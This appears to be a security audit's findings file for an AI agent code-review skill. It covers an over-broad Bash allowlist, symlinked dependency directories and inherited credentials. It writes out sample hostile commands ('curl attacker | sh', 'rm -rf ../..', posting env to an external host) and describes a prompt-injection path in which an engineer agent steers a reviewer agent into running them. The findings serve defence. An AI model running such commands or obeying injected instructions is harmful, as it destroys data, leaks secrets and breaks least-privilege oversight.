findings.cross_file_justification: SKILL.md (diff-touched) adds `Bash(.claude/scripts/red-test-check.sh *)` to the review role's Bash allowlist; red-test-check.sh (diff-touched) execs whatever follows `--` and whatever `--setup` names, so the allowlist entry is a generic command executor.
findings.description: The reviewing-code role was deliberately restricted to `git diff`, `git log` and a fixed set of scripts, with Write/Edit limited to the State zone. The new allowlist line permits `red-test-check.sh` with any arguments. Inside the script, `run_bounded` does `exec "$@"` on the argv after `--` (and on the whitespace-split `--setup` string) with cwd in a worktree but with the reviewer's full environment, uid and filesystem access. The script only validates `--red`/`--green`/`--timeout`; the test command itself is unconstrained. SKILL.md Phase 2 instructs the reviewer to take the red commit from the engineer-authored `reviewer.md` and run the test command from there, so an engineer agent (or a prompt-injected PR description/test file) can direct the reviewer to run `-- curl attacker | sh`, `-- git push`, `-- rm -rf ../..` etc. This collapses the reviewer's least-privilege boundary (C-PROC-001 zones, ICE push guard) through a single allowlisted wrapper.
findings.failure_mode: A compromised or injected implementing agent writes a `Red commit:` line and a test command of its choosing into reviewer.md; the review agent, following Phase 2, invokes red-test-check.sh with that command and the Bash allowlist lets it through, giving arbitrary code execution and write/push access from the review role that is supposed to be near read-only.
findings.suggested_fix: Do not expose a generic argv executor to the reviewer. Options: (a) have red-test-check.sh accept only a fixed set of runner names (e.g. `--runner bats|pytest|npm-test|cargo-test|go-test`) plus a `--test-file`, and build the argv internally; (b) read the test command from a committed, reviewed config (e.g. `.loa.config.yaml: bug.test_command`) instead of CLI/reviewer.md; (c) at minimum narrow the SKILL.md entry to `Bash(.claude/scripts/red-test-check.sh --red * -- bats *)` style patterns and drop `--setup` from the reviewer path. Also have the script refuse argv[0] values that are shells or network tools (`bash`, `sh`, `curl`, `wget`, `python -c`).

findings.description: `link_deps` is on by default and symlinks the live tree's `node_modules`, `.venv`, `vendor`, `target` and `.tox` into both detached worktrees before the test runs. The test command then executes code from the red and green commits, which are PR-controlled, with write access through those symlinks into the reviewer's live dependency directories. A malicious or compromised commit can plant a modified module (e.g. a patched `node_modules/.bin/jest` or a `.venv` sitecustomize) that executes on every later run in the live tree, long after the worktrees are removed. The header acknowledges the behaviour, but the safe mode (`--no-link-deps`) is opt-in and the reviewer skill does not instruct its use.
findings.failure_mode: Attacker-controlled test at the red commit writes into `${MAIN}/node_modules` via the symlink; subsequent legitimate test/tool invocations in the live checkout execute the planted code with the operator's privileges, persisting across the review.
findings.suggested_fix: Make dependency linking opt-in (`--link-deps`) or mount the directories read-only (copy with `cp -a`/hardlink farm, or bind-mount read-only where available). If symlinking stays, document in SKILL.md that the reviewer must pass `--no-link-deps` for /bug reviews of untrusted branches.

findings.description: The test argv is exec'd after only `unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_PREFIX`; every other environment variable of the reviewer process is inherited. The reviewing-code skill runs inside an agent session that typically holds model-provider credentials for Cheval/Flatline dispatch, GitHub tokens for Bridgebuilder, and similar. The code under test comes from the red/green commits, i.e. from the PR author, so a hostile test file can read and exfiltrate those secrets. The `red_tail`/`green_tail` output is also echoed back into the review transcript and JSON, so any secret a test prints lands in tracked review artifacts.
findings.failure_mode: A test at the red commit does `console.log(process.env)` or posts `env` to an external host; keys for the model provider or GitHub leak, and the stdout tail copies them into engineer-feedback/trajectory files.
findings.suggested_fix: Run the test argv under `env -i` with an explicit allowlist (`PATH`, `HOME`, `LANG`, `TMPDIR`, runner-specific vars) or at least `unset` known credential variables (ANTHROPIC_API_KEY, OPENAI_API_KEY, GITHUB_TOKEN, GH_TOKEN, AWS_*). Consider passing the captured tails through the existing pii-filter before printing.

findings.description: `validate_glossary` passes `"$FILE"` as a bare awk operand and also via `-v f="$FILE"`. An operand of the form `name=value` is treated by awk as a variable assignment, not a file, so awk falls back to stdin and the validation silently reads nothing (or hangs). The `-v` value additionally undergoes backslash-escape processing, so filenames containing `\n` or `\t` are mangled in the emitted violation messages. This is a robustness gap in a fail-closed validator rather than a direct vulnerability, and the same pattern likely exists in the sibling validators.
findings.failure_mode: A glossary path such as `docs/a=b/GLOSSARY.md` causes awk to treat the operand as an assignment; with stdin attached the validator blocks, with stdin closed it reports 'no H1' against the wrong input.
findings.suggested_fix: Pass the file as `./"$FILE"` or precede it with a `--`-equivalent by using `awk '...' /dev/stdin < "$FILE"`, and set `f` via `ENVIRON` (`F="$FILE" awk '... ENVIRON["F"] ...'`) to avoid escape processing.
